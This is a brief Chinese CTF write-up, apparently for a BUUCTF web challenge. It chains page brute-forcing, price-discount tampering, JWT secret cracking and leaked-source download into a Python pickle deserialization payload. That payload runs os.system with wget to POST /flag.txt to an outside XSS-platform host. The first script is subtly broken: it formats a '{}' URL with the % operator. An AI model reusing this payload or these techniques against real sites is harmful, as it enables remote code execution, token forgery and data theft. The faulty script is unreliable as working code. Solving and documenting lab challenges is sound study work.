注册登录

```python
import requests

url = "http://web44.buuoj.cn/shop?page={}"

for i in range(1000):
	r = requests.get(url%i)
	if 'lv6' in r.text:
		print url%i
		break

#181
```

购物车

```
name="discount"  value 改小一点
```

结算弹出需要admin

使用工具爆破JWT密钥`1kun`

贴上修改后的JWT

结算成功

查看源代码，源码泄露，下载下来

```
static/asd1f654e683wq/www.zip
```

`Admin.php`存在pickle反序列化漏洞

```python
import os
import pickle
import urllib

class test(object):
    def __reduce__(self):
        return (os.system,("wget 'http://xss.buuoj.cn/index.php?do=api&id=C4TW4q' --post-data='location='`cat /flag.txt` -O-",))

a=test()
payload=pickle.dumps(a)
print(urllib.quote(payload))
```


改become  value 为payload
